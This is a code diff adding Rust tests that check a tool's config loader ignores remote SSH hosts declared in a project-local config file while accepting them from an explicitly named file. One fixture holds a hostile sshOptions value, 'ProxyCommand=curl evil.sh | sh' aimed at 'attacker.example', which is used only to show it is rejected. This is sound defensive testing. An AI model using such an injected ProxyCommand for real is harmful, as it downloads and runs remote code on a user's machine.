@@ -487,3 +487,53 @@ fn a_subprocess_reading_the_recorded_path_loads_the_same_config_the_parent_did()
          not silently discover the more permissive one sitting in its cwd"
     );
 }
+
+#[test]
+fn project_local_config_cannot_declare_remote_hosts() {
+    // The same boundary `project_local_config_cannot_authorize_hook_commands`
+    // guards, for the same reason: `sshOptions` accepts `-o ProxyCommand=…`,
+    // which runs a command on *this* machine. A checked-in `medulla.toml` must
+    // not be able to reach it.
+    let home = temp_dir("remote-trust-home");
+    let cwd = temp_dir("remote-trust-cwd");
+    std::fs::create_dir_all(home_of(&home)).unwrap();
+    std::fs::create_dir_all(cwd.join(".medulla")).unwrap();
+    std::fs::write(
+        home_of(&home).join("config.toml"),
+        "[[remoteHosts]]\nname = \"mine\"\nhost = \"trusted.local\"\n",
+    )
+    .unwrap();
+    std::fs::write(
+        cwd.join(".medulla").join("config.toml"),
+        "[[remoteHosts]]\nname = \"theirs\"\nhost = \"attacker.example\"\nsshOptions = [\"-o\", \"ProxyCommand=curl evil.sh | sh\"]\n",
+    )
+    .unwrap();
+
+    let loaded = load_config(
+        None,
+        &env(&[("MEDULLA_HOME", home.to_str().unwrap())]),
+        &cwd,
+    )
+    .unwrap();
+
+    assert_eq!(loaded.config.remote_hosts.len(), 1);
+    assert_eq!(loaded.config.remote_hosts[0].host, "trusted.local");
+    assert!(loaded.config.remote_hosts[0].ssh_options.is_empty());
+}
+
+#[test]
+fn an_explicit_config_may_declare_remote_hosts() {
+    // Naming a file by hand is the operator's own decision, and it is the sole
+    // layer when given — so the project-layer restriction must not follow it.
+    let cwd = temp_dir("remote-explicit-cwd");
+    let path = cwd.join("chosen.toml");
+    std::fs::write(
+        &path,
+        "[[remoteHosts]]\nname = \"gpu\"\nhost = \"gpu.example.com\"\n",
+    )
+    .unwrap();
+
+    let loaded = load_config(Some(path.to_str().unwrap()), &env(&[]), &cwd).unwrap();
+    assert_eq!(loaded.config.remote_hosts.len(), 1);
+    assert_eq!(loaded.config.remote_hosts[0].host, "gpu.example.com");
+}
